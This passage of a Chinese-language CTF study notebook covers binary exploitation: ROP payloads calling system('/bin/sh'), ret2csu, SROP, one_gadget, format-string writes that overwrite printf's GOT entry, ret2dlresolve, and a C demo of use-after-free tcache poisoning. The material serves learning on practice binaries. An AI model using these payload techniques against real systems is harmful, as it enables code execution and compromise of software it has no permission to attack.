class="hljs-string">b&quot;A&quot;</span> * padding<br>payload += p64(ret)<br>payload += p64(pop_rdi_ret)<br>payload += p64(bin_sh)<br>payload += p64(system_addr)<br>payload += p64(main)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15910485.html">关于学习ret2csu的总结 - ZikH26 - 博客园</a></p>
+<p><img src="/pwn-notes/images/notes/image-20260717100054314.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260717100054314"></p>
+<p>这个作为gadget1,主要是用来传递参数。</p>
+<p><img src="/pwn-notes/images/notes/image-20260717100149363.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260717100149363"></p>
+<p>这个主要就是将gadget1的参数传到edi rsi rdx中，然后就是通过call r12来调用函数。</p>
+<h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12236">SROP详解-先知社区</a></p>
+<p>调用号是15 (0xf)</p>
+<p>后面再跟上syscall</p>
+<p>然后需要记一下信号帧的结构</p>
+<p><img src="/pwn-notes/images/notes/image-20260717100633970.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260717100633970"></p>
+<h2 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget"></a>onegadget</h2><p><img src="/pwn-notes/images/notes/image-20260714093337581.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260714093337581"></p>
+<p>首先就是寻找对应的libc文件的onegadget,然后可以将返回地址改成这个onegadget,之后就可以直接跳过去。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">one_gadget</span> ./libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so<br></code></pre></td></tr></table></figure>
+
+<p>显示更多，</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">onegadget</span> ./libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so -l2<br></code></pre></td></tr></table></figure>
+
+<p>寻找与某一个函数相接近的</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">one_gadget</span> ./libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so --near read<br></code></pre></td></tr></table></figure>
+
+<p>这个时候就可以尾字节覆盖，修改read函数</p>
+<p>因为ASLR只会改变基址，但是偏移并不会改变，所以只需要改变低字节就行，但是两个地址必须在同一个内存页里，这个时候只需要修改低字节就可以。</p>
+<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p><a target="_blank" rel="noopener" href="https://gugesay.com/blog/pwn%E7%AC%94%E8%AE%B0-3/">PWN笔记-3 | Guge’sBlog</a></p>
+<p>简述：C语言中printf函数中所蕴含的漏洞</p>
+<p>例如：</p>
+<p>int a&#x3D;10;</p>
+<p>printf(“%d”,a);</p>
+<p>最后输出的结果就是10进制所定义的数值</p>
+<p>格式化字符串：例如像%d,就是一些格式化字符串</p>
+<img src="/pwn-notes/images/notes/image-20260718170212062.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260718170212062" style="zoom:50%;" />
+
+<p>而</p>
+<p>printf(“%d %d %d”,1,2);</p>
+<p>需要输出的是3个参数，而实际上仅仅只是传入了2个参数，所以这个时候就会打印出除了1,2之后还有一个参数</p>
+<p>而，我觉得利用的主要就是</p>
+<p><img src="/pwn-notes/images/notes/image-20260719103800504.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260719103800504"></p>
+<p>%n$n</p>
+<p>type–&gt;格式化字符串</p>
+<h3 id="1-str-n-n"><a href="#1-str-n-n" class="headerlink" title="1.(str)%n$n"></a>1.(str)%n$n</h3><p>将str输出的字符串个数输入第n个内存地址中</p>
+<h3 id="2-nc"><a href="#2-nc" class="headerlink" title="2.%nc"></a>2.%nc</h3><p><code>%c</code> 原本功能：打印<strong>1 个字符</strong>（取栈上参数的 ASCII 值输出）。</p>
+<p>当写成 <code>%Nc</code>（N 是数字，比如<code>%777c</code>），代表<strong>固定输出 N 个字符</strong>：</p>
+<p>（str）%111c%11$n</p>
+<p>将str+111个字节数写入11内存处</p>
+<h3 id="3-覆盖小数字"><a href="#3-覆盖小数字" class="headerlink" title="3.覆盖小数字"></a>3.覆盖小数字</h3><p><img src="/pwn-notes/images/notes/image-20260719102919798.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260719102919798"></p>
+<p>如果想要将一个地址内的内容改成一个比4小的数字。</p>
+<p>我们知道</p>
+<p>（str）%6$n</p>
+<p>就是将字符串数写入格式化字符串后第六个位置</p>
+<p>所以这个时候</p>
+<p>如果想讲一个地址内容改为2</p>
+<p>只需要       aa%8  $naa  p32(addr)</p>
+<p>aa%8 第6个参数</p>
+<p>$naa第7个参数</p>
+<p>p32(addr)第8个参数</p>
+<h3 id="4-覆盖大数据"><a href="#4-覆盖大数据" class="headerlink" title="4.覆盖大数据"></a>4.覆盖大数据</h3><p>x86 架构是<strong>小端序</strong>：<strong>低字节存低地址，高字节存高地址</strong>。</p>
+<p>目标值 <code>0x12345678</code> 拆分 4 个单字节：</p>
+<p>完整十六进制数字：<code>0x 12  34  56  78</code></p>
+<ul>
+<li>最高字节：<code>0x12</code></li>
+<li>次高字节：<code>0x34</code></li>
+<li>次低字节：<code>0x56</code></li>
+<li>最低字节：<code>0x78</code></li>
+</ul>
+<p>按照小端存入连续内存：</p>
+<p>表格</p>
+<table>
+<thead>
+<tr>
+<th align="center">内存地址</th>
+<th align="center">存储字节</th>
+<th align="center">对应数值片段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>b_addr+0</code></td>
+<td align="center"><code>0x78</code></td>
+<td align="center">最低 8 位</td>
+</tr>
+<tr>
+<td align="center"><code>b_addr+1</code></td>
+<td align="center"><code>0x56</code></td>
+<td align="center">次低 8 位</td>
+</tr>
+<tr>
+<td align="center"><code>b_addr+2</code></td>
+<td align="center"><code>0x34</code></td>
+<td align="center">次高 8 位</td>
+</tr>
+<tr>
+<td align="center"><code>b_addr+3</code></td>
+<td align="center"><code>0x12</code></td>
+<td align="center">最高 8 位</td>
+</tr>
+</tbody></table>
+<ol start="3">
+<li>位运算公式拆解：<code>变量值 = (字节3 &lt;&lt; 24) | (字节2 &lt;&lt; 16) | (字节1 &lt;&lt; 8) | 字节0</code></li>
+</ol>
+<p>移位 <code>&lt;&lt;</code> 作用：把单字节放到对应权重的二进制位上</p>
+<ol>
+<li><p>字节 0（0x78，b_addr+0）→ 最低 8 位</p>
+<p>不做移位，直接占 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>~<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p> 二进制位：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0x78<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>字节 1（0x56，b_addr+1）→ 次低 8 位</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;&lt; <span class="hljs-string">8</span><br></code></pre></td></tr></table></figure>
+
+<p>：向左移 8 个二进制位，占据 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>~<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure>
+
+<p> 位：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0x5600<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>字节 2（0x34，b_addr+2）→ 次高 8 位</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;&lt; <span class="hljs-string">16</span><br></code></pre></td></tr></table></figure>
+
+<p>：向左移 16 个二进制位，占据 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">16</span>~<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
+
+<p> 位：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0x340000<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>字节 3（0x12，b_addr+3）→ 最高 8 位</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;&lt; <span class="hljs-string">24</span><br></code></pre></td></tr></table></figure>
+
+<p>：向左移 24 个二进制位，占据 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">24</span>~<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure>
+
+<p> 位：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0x12000000<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p><code>|</code> 是按位或，把四段拼接成完整 4 字节数字：</p>
+<p>plaintext</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">0x12000000<br>| 0x340000<br>| 0x5600<br>| 0x78<br><span class="hljs-section">= 0x12345678</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pwn-notes/images/notes/image-20260719110140358.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260719110140358"></p>
+<h3 id="5-修改got表"><a href="#5-修改got表" class="headerlink" title="5.修改got表"></a>5.修改got表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=fmtstr_payload(offset, &#123;printfGOT:systemAddress&#125;)<br>r.sendline(payload)<br></code></pre></td></tr></table></figure>
+
+<p>offset相对于格式化字符串的偏移</p>
+<p>后面就相当于，将printf的got表改成system函数</p>
+<p>（算了，先学到这吧）（那个非栈上的什么指针链，smff,zgln我去了，真的有点不太懂啊，就只知道是将got表分块写到栈上，然后再接着写入，修改printfGot表）</p>
+<h2 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h2><p><img src="/pwn-notes/images/notes/image-20260716200102780.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260716200102780"></p>
+<p><img src="/pwn-notes/images/notes/image-20260716201327296.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260716201327296"></p>
+<p><img src="/pwn-notes/images/notes/image-20260716201524666.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260716201524666"></p>
+<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><ul>
+<li>无符号上溢：无符号数0xFFFFFFFF加1变为0的情况。</li>
+<li>无符号下溢：无符号数0减去1变为0xFFFFFFFF的情况。</li>
+<li>有符号上溢：有符号数正数0x7FFFFFFF加1变为负数0x80000000，即十进制-2147483648的情况。</li>
+<li>有符号下溢：有符号负数0x80000000减去1变为正数0x7FFFFFFF的情况。</li>
+</ul>
+<ol>
+<li>溢出，只有有符号数才会发生溢出。有符号数的最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出。<code>溢出标志OF</code>可检测有符号数的溢出；</li>
+<li>回绕，无符号数0减1时会变成最大的数，如1字节的无符号数会变为255，而255加1会变成最小数0。<code>进位标志CF</code>可检测无符号数的回绕；</li>
+</ol>
+<p>根据其各自的特性来决定的，</p>
+<p>3.截断：</p>
+<p><img src="/pwn-notes/images/notes/image-20260722094230638.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260722094230638"></p>
+<p>加法截断，如果放到64位里面就会显现出完整的数，但是如果是32位就会截取低32位，只剩0.</p>
+<h2 id="DL"><a href="#DL" class="headerlink" title="DL"></a>DL</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51868336/article/details/114644569">ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客</a></p>
+<p>这啥</p>
+<p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37572651">新手向]ret2dl-resolve详解 - 知乎</a></p>
+<p>基础概念</p>
+<p>PLT &#x3D; Procedure Linkage Table，过程链接表</p>
+<p>plt [0]（plt0）：全局唯一，公共跳板入口</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span> [<span class="hljs-built_in">ebx</span>+<span class="hljs-number">4</span>]    # <span class="hljs-keyword">push</span> link_map* l (参数<span class="hljs-number">1</span>)<br><span class="hljs-keyword">jmp</span> _dl_runtime_resolve<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>reloc_arg：偏移量</p>
+<p>是目标重定位结构体地址距离rel.plt起始地址的距离</p>
+<p>.rel.plt &#x3D; Relocation for PLT，用于 PLT 延迟绑定的重定位段</p>
+<p>里面存的是数组，而每一个数组都是一个Elf32_Rel 结构体</p>
+<p>rel &#x3D; l-&gt;l_reloc + reloc_arg</p>
+<p>l-&gt;l_reloc 是结构体里的一个成员：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Elf32_Rel *l_reloc;<br></code></pre></td></tr></table></figure>
+
+<p><strong>指针</strong>，保存 <strong><code>.rel.plt</code> 段的起始虚拟地址</strong>。</p>
+<p>重定位结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Elf32_Rel</span> &#123;</span><br>    Elf32_Addr r_offset; <span class="hljs-comment">// 要填充的GOT地址</span><br>    Elf32_Word r_info;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>r_info:</p>
+<p>高24位：符号下标 num </p>
+<p>低 8位：重定位类型 type</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">num = r_info &gt;&gt; <span class="hljs-number">8</span>;    <span class="hljs-comment">// 向右移动8位，直接丢掉最低8位type，取出高24位num</span><br>type = r_info &amp; <span class="hljs-number">0xff</span>; <span class="hljs-comment">// 和0xff按位与，保留最低8位，获取重定位类型</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>sym &#x3D; l-&gt;l_symtab + num*16(找到需要的符号结构体)</p>
+<p>l-&gt;l_symtab  → .dynsym  起始地址，Elf32_Sym数组首地址</p>
+<p>Elf32_Sym 符号结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Elf32_Sym</span> &#123;</span><br>    Elf32_Word    st_name;   <span class="hljs-comment">// 4字节</span><br>    Elf32_Addr    st_value;  <span class="hljs-comment">// 4字节</span><br>    Elf32_Word    st_size;    <span class="hljs-comment">// 4字节</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;    <span class="hljs-comment">// 1字节</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;   <span class="hljs-comment">// 1字节</span><br>    Elf32_Half    st_shndx;   <span class="hljs-comment">// 2字节</span><br>&#125;;<br><span class="hljs-comment">// 总大小 = 16字节（0x10）</span><br></code></pre></td></tr></table></figure>
+
+<p>我们需要的是符号结构体中的st_name</p>
+<p>l-&gt;l_strtab  → .dynstr  起始地址，字符串表首地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *func_name = l-&gt;l_strtab + st_name;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>这样就找到了函数名地址，之后就去寻找这个函数真实地址返回到一开始的重定位结构体中的offset就是一开始伪造的got表中，这样之后调用这个函数不再进行解析，直接去这个got表中获得函数地址，而这个函数地址已经被我们修改为system函数地址</p>
+<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>[CTF pwn 中最通俗易懂的堆入坑指南-安全KER - 安全资讯平台](<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/163971#:~:text=%E9%A6%96%E5%85%88%E5%85%88%E6%98%8E%E7%A1%AE%E4%B8%80%E4%B8%8B%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5%EF%BC%8C%E5%A0%86%E4%B8%8D%E5%90%8C%E4%BA%8E%E6%A0%88%EF%BC%8C%E5%A0%86%E6%98%AF%E5%8A%A8%E6%80%81%E5%88%86%E9%85%8D%E7%9A%84%EF%BC%88%E7%94%B1%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8%E6%88%96%E8%80%85%E5%A0%86%E7%AE%A1%E7%90%86%E5%99%A8%EF%BC%89%EF%BC%8C%E5%8F%AA%E6%9C%89%E5%9C%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E9%9C%80%E8%A6%81%E6%97%B6%E6%89%8D%E4%BC%9A%E5%88%86%E9%85%8D%E3%80%82">https://www.anquanke.com/post/id/163971#:~:text=首先先明确一下堆的概念，堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。</a> 在 CTF 的 pwn,程序中，栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。 先看看堆在虚拟内存中的位置 堆的生长方向是从低地址向高地址生长的，而栈是从高地址向低地址生长的。)</p>
+<h4 id="堆的内存结构"><a href="#堆的内存结构" class="headerlink" title="堆的内存结构"></a>堆的内存结构</h4><p>运行过程中被malloc分配的内存为一个chunk，这块内存在ptmalloc中用malloc_chunk结构体表示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>堆块的不同状态：</p>
+<p>正在使用时</p>
+<p><img src="/pwn-notes/images/notes/image-20260728152239012.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260728152239012"></p>
+<p>mem：malloc() 返回给程序的指针（用户可用区域起始）</p>
+<p>prev_size：只有前一个 chunk 空闲的时候，这个字段才有效；前一块正在使用，此字段无意义。</p>
+<p>P bit（最低位，Prev_inuse）
+P&#x3D;1：前相邻 chunk 正在被占用
+P&#x3D;0：前相邻 chunk 空闲，free 时会触发向前合并
+M bit：mmap 分配标记（大块直接 mmap 出来的堆块才置 1，不进入任何 bin）
+A bit：非主 arena 标记（子线程 arena 置 1）</p>
+<p>被free时</p>
+<p><img src="/pwn-notes/images/notes/image-20260728152315412.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260728152315412"></p>
+<p>堆被释放之后存在了bins里</p>
+<p><img src="/pwn-notes/images/notes/image-20260728160524639.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260728160524639"></p>
+<p>先分配给fastbins然后再在smallbins然后在largbins寻找，最后去unsortedbins其它的现在还不清楚。</p>
+<p><img src="/pwn-notes/images/notes/image-20260728161502026.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260728161502026"></p>
+<p><img src="/pwn-notes/images/notes/image-20260728161547343.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260728161547343"></p>
+<p><img src="/pwn-notes/images/notes/image-20260728161616506.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260728161616506"></p>
+<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272416-1.htm">原创]how2heap深入浅出学习堆利用-Pwn-看雪安全社区｜专业技术交流与安全研究论坛</a></p>
+<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">char</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p = %p\n&quot;</span>, p);<br><br>    <span class="hljs-comment">// 填充测试数据</span><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(p + <span class="hljs-number">0x00</span>) = <span class="hljs-number">0x1111111111111111</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(p + <span class="hljs-number">0x08</span>) = <span class="hljs-number">0x2222222222222222</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;-----free(p)\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p);<br><br>    <span class="hljs-comment">// ========= UAF 漏洞 =========</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UAF read p: %s\n&quot;</span>, p);<br><br>    <span class="hljs-comment">// ✅正确：UAF写，直接修改tcache fd（fd就在p起始位置）</span><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)p = <span class="hljs-number">0xdeadbeef</span>;<br><br>    <span class="hljs-comment">// 第一次malloc：取出当前tcache里的0x4052a0，entry更新为我们伪造的fd=0xdeadbeef</span><br>    <span class="hljs-type">char</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %p\n&quot;</span>, a);<br><br>    <span class="hljs-comment">// 第二次malloc：返回伪造地址0xdeadbeef，拿到fake指针（AAW）</span><br>    <span class="hljs-type">char</span> *fake = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake ptr = %p\n&quot;</span>, fake);<br><br>    getchar(); <span class="hljs-comment">// 暂停，pwndbg调试用</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>来一步一步调一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这个就是申请堆空间，然后给p返回了一个地址</p>
+<p><img src="/pwn-notes/images/notes/image-20260808105457634.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808105457634"></p>
+<p>没有执行之前</p>
+<p>执行完之后</p>
+<p><img src="/pwn-notes/images/notes/image-20260808105545821.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808105545821"></p>
+<p>当然看不懂了，来瞅瞅豆沙</p>
+<p>首先就是0x290就是glibc自己申请的管理结构，里面有一些释放的堆块记录</p>
+<p><img src="/pwn-notes/images/notes/image-20260808110645569.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808110645569"></p>
+<p><img src="/pwn-notes/images/notes/image-20260808110707989.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808110707989"></p>
+<p>然后下面那个，大小为0x30的就是我们申请的。</p>
+<p>但是我们申请的是0x20，这是因为还包括了头部0x10字节，就是</p>
+<p><img src="/pwn-notes/images/notes/image-20260808110949840.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808110949840"></p>
+<p>剩下的top_chunk就是等着被malloc的空间</p>
+<p><img src="/pwn-notes/images/notes/image-20260808111309282.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808111309282"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">pwndbg&gt; p p<br><span class="hljs-variable">$2</span> = <span class="hljs-number">0</span>x4052a0<br></code></pre></td></tr></table></figure>
+
+<p>这个就是申请堆块返回的数据块开头的指针。</p>
+<p><img src="/pwn-notes/images/notes/image-20260808112100305.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808112100305"></p>
+<p>此时已经向内存块写入数据</p>
+<p>接着就该释放</p>
+<p><img src="/pwn-notes/images/notes/image-20260808113025575.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808113025575"></p>
+<p><img src="/pwn-notes/images/notes/image-20260808113144706.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808113144706"></p>
+<p><img src="/pwn-notes/images/notes/image-20260808113200822.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808113200822"></p>
+<p>发现在free之后我们之前申请的堆块出现了一个指针，名字也变成了free chunk，同时里面的数据也改变了</p>
+<p><img src="/pwn-notes/images/notes/image-20260808113508822.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808113508822"></p>
+<p><img src="/pwn-notes/images/notes/image-20260808113806926.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808113806926"></p>
+<p>现在来看看tache</p>
+<p><img src="/pwn-notes/images/notes/image-20260808113200822.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808113200822"></p>
+<p><img src="/pwn-notes/images/notes/image-20260808143936540.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808143936540"></p>
+<p><img src="/pwn-notes/images/notes/image-20260808143952606.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808143952606"></p>
+<p>也就是说，一开始会告诉你tcache的准确位置，之后是空闲块的数量，接着是各个空闲链表表头。</p>
+<p>在这里指针并没有清零，虽然里面现在存储的是tache的指针，但是可以修改里面的内容。</p>
+<p><img src="/pwn-notes/images/notes/image-20260808145103762.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260808145103762"></p>
+<p>而这个时候我们如果再次申请同样大小的堆块，那么就会从tache里面找到，0x4052a0&#x3D;a</p>
+<p>这个时候，a和p都指向这块内存</p>
+<p>char *a &#x3D; malloc(0x20);申请完之后：</p>
